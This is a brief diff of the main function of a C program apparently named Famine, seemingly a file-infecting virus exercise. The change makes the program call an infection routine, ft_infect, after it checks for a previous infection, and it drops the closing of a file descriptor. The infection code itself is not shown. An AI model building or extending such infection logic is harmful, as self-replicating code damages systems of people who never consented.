@@ -62,9 +62,8 @@ int main(int argc, char **argv, char **env)
     ft_pointer_strings_table(famine);
     ft_printheader(famine);
 
-    ft_detect_prev_infection(famine);
-
-    close(famine->fd);
+    if (ft_detect_prev_infection(famine))
+        ft_infect(famine);
     free(famine);
     return (0);
 }
